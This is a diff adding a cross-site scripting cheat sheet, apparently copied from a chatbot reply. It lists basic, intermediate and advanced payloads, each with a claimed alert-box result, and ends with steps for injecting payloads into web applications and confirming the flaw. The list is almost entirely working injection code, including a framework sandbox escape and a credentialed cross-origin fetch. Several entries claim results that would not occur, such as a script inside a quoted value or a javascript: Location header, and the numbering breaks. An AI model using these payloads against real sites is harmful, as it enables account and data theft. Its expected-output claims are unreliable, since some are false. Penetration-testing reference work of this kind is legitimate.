@@ -1,0 +1,448 @@
+
+Basic XSS Payloads
+1. Basic Script Alert
+htmlCopy code
+
+<script>alert('XSS')</script>
+
+
+Expected Output: An alert box displaying "XSS".
+
+2. Image with OnError Attribute
+htmlCopy code
+
+<img src="invalid-image" onerror="alert('XSS')">
+
+
+Expected Output: An alert box displaying "XSS" when the image fails to load.
+
+3. Basic Input Field Injection
+htmlCopy code
+
+<input type="text" value="<script>alert('XSS')</script>">
+
+
+Expected Output: An alert box displaying "XSS" when the input value is rendered.
+
+4. Anchor Tag with JavaScript URL
+htmlCopy code
+
+<a href="javascript:alert('XSS')">Click me</a>
+
+
+Expected Output: An alert box displaying "XSS" when the link is clicked.
+
+5. Broken HTML Tag
+htmlCopy code
+
+<svg><script>alert(1)</script>
+
+
+Expected Output: An alert box displaying "1".
+
+6. Event Handler on Anchor Tag
+htmlCopy code
+
+<a href="#" onclick="alert('XSS')">Click me</a>
+
+
+Expected Output: An alert box displaying "XSS" when the link is clicked.
+
+7. Input Field onFocus Event
+htmlCopy code
+
+<input type="text" onfocus="alert('XSS')">
+
+
+Expected Output: An alert box displaying "XSS" when the input field gains focus.
+
+8. DIV Tag with onmouseover Event
+htmlCopy code
+
+<div onmouseover="alert('XSS')">Hover over me</div>
+
+
+Expected Output: An alert box displaying "XSS" when the mouse hovers over the DIV.
+
+9. Form Action Attribute
+htmlCopy code
+
+<form action="javascript:alert('XSS')">
+<input type="submit" value="Submit">
+</form>
+
+
+Expected Output: An alert box displaying "XSS" when the form is submitted.
+
+10. Button with onClick Event
+htmlCopy code
+
+<button onclick="alert('XSS')">Click me</button>
+
+
+Expected Output: An alert box displaying "XSS" when the button is clicked.
+
+
+Intermediate XSS Payloads
+1. Script Alert with Encoded Characters
+htmlCopy code
+
+%3Cscript%3Ealert('XSS')%3C/script%3E
+
+
+Expected Output: An alert box displaying "XSS".
+
+2. Iframe with JavaScript URL
+htmlCopy code
+
+<iframe src="javascript:alert('XSS')"></iframe>
+
+
+Expected Output: An alert box displaying "XSS".
+
+3. Div with Background Image URL
+htmlCopy code
+
+<div style="background-image: url('javascript:alert(\'XSS\')')"></div>
+
+
+Expected Output: An alert box displaying "XSS".
+
+4. Embedded SVG
+htmlCopy code
+
+<svg/onload=alert('XSS')>
+
+
+Expected Output: An alert box displaying "XSS".
+
+5. Stored XSS in Comment Section
+htmlCopy code
+
+<script>alert('Stored XSS')</script>
+
+
+Expected Output: An alert box displaying "Stored XSS" when the comment is rendered.
+
+6. Using a Data URI
+htmlCopy code
+
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">Click me</a>
+
+
+Expected Output: An alert box displaying "XSS" when the link is clicked.
+
+7. JavaScript Execution in Style Attribute
+htmlCopy code
+
+<div style="xss:expression(alert('XSS'))">Click me</div>
+
+
+Expected Output: An alert box displaying "XSS".
+
+8. HTML5 Meter Element
+htmlCopy code
+
+<meter onmouseover="alert('XSS')">2 out of 10</meter>
+
+
+Expected Output: An alert box displaying "XSS" when the mouse hovers over the meter.
+
+9. HTML5 Progress Element
+htmlCopy code
+
+<progress value="22" max="100" onclick="alert('XSS')">22%</progress>
+
+
+Expected Output: An alert box displaying "XSS" when the progress bar is clicked.
+
+10. Input Field with Autocomplete
+htmlCopy code
+
+<input type="text" name="name" autocomplete="new-password" onfocus="alert('XSS')">
+
+
+Expected Output: An alert box displaying "XSS" when the input field gains focus.
+
+
+Advanced XSS Payloads
+1. Exploiting JSON Context
+htmlCopy code
+
+{"name":"<script>alert('XSS')</script>"}
+
+
+Expected Output: An alert box displaying "XSS" when the JSON is rendered without proper escaping.
+
+2. AngularJS Sandbox Escape
+htmlCopy code
+
+{{constructor.constructor('alert(1)')()}}
+
+
+Expected Output: An alert box displaying "1".
+
+3. React JSX Injection
+htmlCopy code
+
+{/*<!--<script>alert('XSS')</script>-->*/}
+
+
+Expected Output: An alert box displaying "XSS" if JSX is improperly sanitized.
+
+4. Vue.js Template Injection
+htmlCopy code
+
+{{alert('XSS')}}
+
+
+Expected Output: An alert box displaying "XSS".
+
+5. Attribute Injection with Backticks
+htmlCopy code
+
+<input type="text" value=`onmouseover="alert('XSS')"`>
+
+
+Expected Output: An alert box displaying "XSS" when the mouse hovers over the input field.
+
+6. Using JavaScript URI in CSS
+htmlCopy code
+
+<style>@import 'javascript:alert("XSS")';</style>
+
+
+Expected Output: An alert box displaying "XSS".
+
+7. Exploiting Browser Extensions
+htmlCopy code
+
+<a href="chrome-extension://extension-id/script.js">Click me</a>
+
+
+Expected Output: Depends on the extension; potential XSS execution.
+
+8. Content Security Policy Bypass
+htmlCopy code
+
+<form action="data:text/html,<script>alert('XSS')</script>">
+<input type="submit" value="Submit">
+</form>
+
+
+Expected Output: An alert box displaying "XSS" when the form is submitted.
+
+9. Exploiting Misconfigured CORS
+htmlCopy code
+
+<script>
+fetch('http://vulnerable-website.com/api', {credentials: 'include'})
+.then(response => response.text())
+.then(data => { alert(data); });
+</script>
+
+
+Expected Output: An alert box displaying the fetched data.
+
+10. Exploiting WebSockets
+htmlCopy code
+
+<script>
+var ws = new WebSocket('ws://vulnerable-website.com');
+ws.onopen = function() { ws.send('<script>alert("XSS")</script>'); };
+</script>
+
+
+Expected Output: An alert box displaying "XSS".
+
+11. Using InnerHTML in Complex Applications
+htmlCopy code
+
+<div id="xss"></div>
+<script>document.getElementById('xss').innerHTML = '<img src=x onerror=alert(1)>';</script>
+
+
+Expected Output: An alert box displaying "1".
+
+12. Exploiting Template Literals
+htmlCopy code
+
+<script>
+let name = `${alert('XSS')}`;
+</script>
+
+
+Expected Output: An alert box displaying "XSS".
+
+13. Bypassing HTML Sanitization
+htmlCopy code
+
+<img src="x" onerror="this.onerror=null;alert('XSS');">
+
+
+Expected Output: An alert box displaying "XSS".
+
+14. Using Blob URIs
+htmlCopy code
+
+<script>
+var blob = new Blob(["<script>alert('XSS')</script>"], {type: 'text/html'});
+var url = URL.createObjectURL(blob);
+window.location = url;
+</script>
+
+
+Expected Output: An alert box displaying "XSS".
+
+15. Iframe with sandbox attribute bypass
+htmlCopy code
+
+<iframe sandbox="allow-scripts" srcdoc="<script>alert('XSS')</script>"></iframe>
+
+
+Expected Output: An alert box displaying "XSS".
+
+16. SVG with Use Element
+htmlCopy code
+
+<svg>
+  <use xlink:href="data:image/svg+xml;base64,PHN2ZyBvbmVycm9yPSJhbGVydCgnWFNTJyk+PC9zdmc+"/>
+</svg>
+
+
+Expected Output: An alert box displaying "XSS".
+
+1. Exploiting Content-Disposition Header
+htmlCopy code
+
+Content-Disposition: attachment; filename="<script>alert('XSS')</script>"
+
+
+Expected Output: An alert box displaying "XSS" when the file is downloaded.
+
+2. Using JavaScript Inside Meta Tag
+htmlCopy code
+
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">
+
+
+Expected Output: An alert box displaying "XSS" after the page refreshes.
+
+3. Input Field with SVG Injection
+htmlCopy code
+
+<input type="text" value="x' <svg onload=alert('XSS')>">
+
+
+Expected Output: An alert box displaying "XSS" when the input field is rendered.
+
+4. Exploiting JavaScript Event Attributes
+htmlCopy code
+
+<div oncontextmenu="alert('XSS')">Right click me</div>
+
+
+Expected Output: An alert box displaying "XSS" when the right-click event is triggered.
+
+5. Using JavaScript in CSS Import
+htmlCopy code
+
+<style>@import 'javascript:alert("XSS")';</style>
+
+
+Expected Output: An alert box displaying "XSS".
+
+6. Exploiting HTML5 EventSource
+htmlCopy code
+
+<script>
+var evtSource = new EventSource('data:text/event-stream,<script>alert("XSS")</script>');
+</script>
+
+
+Expected Output: An alert box displaying "XSS".
+
+7. Using JSFiddle Payload
+htmlCopy code
+
+<iframe src="https://jsfiddle.net/n4ptn9ab/"></iframe>
+
+
+Expected Output: Demonstrates XSS attack; actual output varies.
+
+8. JavaScript Injection in Onload Attribute
+htmlCopy code
+
+<body onload="alert('XSS')">
+
+
+Expected Output: An alert box displaying "XSS" when the page loads.
+
+9. Exploiting Data Attributes
+htmlCopy code
+
+<div data-name="&lt;img src=x onerror=alert('XSS')&gt;"></div>
+
+
+Expected Output: An alert box displaying "XSS" when the data attribute is parsed.
+
+10. Input Field with Malformed SVG
+htmlCopy code
+
+<input type="text" value="<svg/onload=alert('XSS')>">
+
+
+Expected Output: An alert box displaying "XSS" when the input field is rendered.
+
+11. Using SVG Injection in XML Content
+xmlCopy code
+
+<content><![CDATA[<svg/onload=alert('XSS')>]]></content>
+
+
+Expected Output: An alert box displaying "XSS".
+
+12. JavaScript URI in Location Header
+htmlCopy code
+
+Location: javascript:alert('XSS')
+
+
+Expected Output: An alert box displaying "XSS".
+
+13. Using Web Workers
+htmlCopy code
+
+<script>
+var blob = new Blob(["onmessage = function(e) { postMessage('XSS'); }"], {type: 'text/javascript'});
+var worker = new Worker(URL.createObjectURL(blob));
+worker.onmessage = function(e) { alert(e.data); };
+worker.postMessage('');
+</script>
+
+
+Expected Output: An alert box displaying "XSS".
+
+14. Exploiting AngularJS Template Injection
+htmlCopy code
+
+<div ng-app ng-csp>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+</div>
+
+
+Expected Output: An alert box displaying "1".
+
+
+How to Use and Confirm XSS:
+1. Inject Payloads: Insert each payload into input fields, URL parameters, or other user-controllable areas of the web application.
+
+2. Observe Behavior: Check how the application responds to each payload. Look for indications of successful XSS execution, such as pop-up alert boxes or unexpected behavior.
+
+3. Inspect HTML Source: View the page source or inspect elements to see if your payload is reflected in the HTML code. If it is, the application is vulnerable to XSS.
+
+4. Interact with the Page: If the payload is reflected in a way that allows user interaction (e.g., clicking a link or submitting a form), interact with the page to trigger the payload and confirm XSS execution.
+
+5. Verify Persistence: For stored XSS, ensure that the injected payload remains in the application even after page refreshes or navigating away from the page.
+
+6. Report Findings: Once confirmed, report the XSS vulnerability to the appropriate parties, following responsible disclosure practices.
+
